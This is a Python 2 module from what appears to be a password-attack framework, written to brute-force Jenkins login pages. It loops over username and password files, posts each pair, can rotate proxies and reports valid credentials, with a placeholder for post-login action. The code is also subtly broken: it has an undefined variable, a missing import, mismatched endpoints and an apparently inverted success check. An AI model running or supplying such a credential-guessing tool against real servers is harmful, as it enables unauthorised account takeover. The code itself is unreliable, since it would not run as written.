#! /usr/bin/python
# this module is for jenkins attacks
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser
from lxml import html
import random


class jenkinsBrute(webModule):
    def __init__(self, config, display, lock):
        super(jenkinsBrute, self).__init__(config, display, lock)
        self.fingerprint="Jenkins"
        self.response="Success"
    def somethingCool(self, config, payload):
        #Do something cool here
        print("Something Cool not yet implemented")
    def connectTest(self, config, payload):
        #Create a session and check if account is valid
        with session() as c:
            proxy = random.choice(config["proxies"])
            cookie = {'JSESSIONID.d29cad0c':'14qy4wdxentt311fbwxdw85z7o'}
            resp1 = c.get(config["HOST"] + '/j_acegi_security_check', cookies=cookie, verify=False, data=payload)#, proxies=proxy)
            print resp1.headers
            cpost = c.post(config["HOST"] + '/employee/j_spring_security_check', cookies=cookies, data=payload, allow_redirects=True, verify=False)
            m = re.search('You are unauthorized to access this page.', cpost.text)
            if m:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                if not config["dry_run"]:
                   print("[!] Time to do something cool!")
                   self.somethingCool(config, payload)
            else:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
    def scraper(self, config):
        # Scrape page to find which parameters are needed
        with session() as c:
            resp1 = c.get(config["HOST"] + '/login', verify=False)
            tree = html.fromstring(resp1.content)
            username = tree.xpath('//input[@id="j_username"]/text()')
            print username
    def payload(self, config):
        if config["PASS_FILE"]:
            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
            for pass_line in pass_lines:
                if config["UserFile"]:
                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                    for line in lines:
                        config["USERNAME"] = line.strip('\n')
                        config["PASSWORD"] = pass_line.strip('\n')
                        payload = {
                            'j_username': config["USERNAME"],
                            'j_password': config["PASSWORD"]
                            }
                        self.connectTest(config, payload)
                        time.sleep(config["timeout"])
                else:
                    config["PASSWORD"] = pass_line.strip('\n')
                    payload = {
                        'j_username': config["USERNAME"],
                        'j_password': config["PASSWORD"]
                        }
                    self.connectTest(config, payload)
                    time.sleep(config["timeout"])
        elif config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'j_username': config["USERNAME"],
                    'j_password': config["PASSWORD"]
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'j_username': config["USERNAME"],
                'j_password': config["PASSWORD"]
            }
            self.connectTest(config, payload)
